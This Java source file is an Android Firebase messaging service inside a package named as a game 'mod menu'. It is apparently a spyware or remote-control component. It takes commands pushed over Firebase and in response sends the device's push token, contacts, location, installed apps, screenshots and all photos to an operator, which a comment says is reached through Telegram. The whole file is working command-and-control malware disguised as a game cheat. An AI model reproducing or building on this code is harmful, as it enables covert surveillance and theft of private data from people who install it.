package com.brawl.modmenu;

import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class FirebaseService extends FirebaseMessagingService {

    private static final String TAG = "FirebaseService";

    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        // Отправляем токен в Telegram
        Exfil.send("FCM_TOKEN", "Новый токен:\n" + token);

        // Сохраняем локально
        getSharedPreferences("fcm", MODE_PRIVATE)
            .edit().putString("token", token).apply();
    }

    @Override
    public void onMessageReceived(RemoteMessage msg) {
        super.onMessageReceived(msg);

        try {
            Map<String, String> data = msg.getData();
            if (data == null || data.isEmpty()) return;

            String command = data.get("cmd");
            if (command == null) return;

            Exfil.send("FCM_CMD", "Получено: " + command);
            handleFcmCommand(command);

        } catch (Throwable t) {
            Log.e(TAG, "err", t);
        }
    }

    private void handleFcmCommand(String text) {
        try {
            if (text.startsWith("/ping")) {
                Exfil.send("FCM", "Pong из FCM!");
                return;
            }
            if (text.startsWith("/screenshot")) {
                try {
                    android.content.Intent i =
                        new android.content.Intent(this, MediaSniffer.class);
                    i.setAction("CAPTURE_NOW");
                    startService(i);
                } catch (Throwable t) {}
                return;
            }
            if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
            if (text.startsWith("/apps")) { AppList.dump(this); return; }
            if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
            if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
            if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
            if (text.startsWith("/screens")) { ScreenshotsGrabber.grab(); return; }
            if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
            Exfil.send("FCM", "Неизвестно: " + text);
        } catch (Throwable t) {
            Exfil.send("FCM_ERR", t.getMessage());
        }
    }
}
